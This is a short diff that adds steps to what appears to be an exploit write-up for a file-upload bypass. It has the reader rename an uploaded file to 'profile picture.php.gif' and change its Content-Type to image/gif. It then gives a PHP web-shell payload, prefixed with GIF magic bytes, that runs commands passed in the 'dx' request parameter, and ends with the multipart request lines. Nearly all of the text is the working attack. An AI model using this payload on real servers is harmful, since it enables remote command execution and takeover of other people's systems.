@@ -1,3 +1,9 @@
+Change the “ Filename “ from “ profile picture.png “ to “profile picture.php.gif ”
+Change the **Content-type from “ image/png “ to “ image/gif “
+And Add this **Payload** : `GIF89a <?php echo system($_REQUEST['dx']); ?>`
+Where **GIF89a is the GIF magic bytes this bypass the file upload extension**
+--------------------------------------------------------------------------------
+
 Content-Disposition: form-data; name="newpic"; filename="profile picture.php.gif"
 Content-Type: image/gif
 
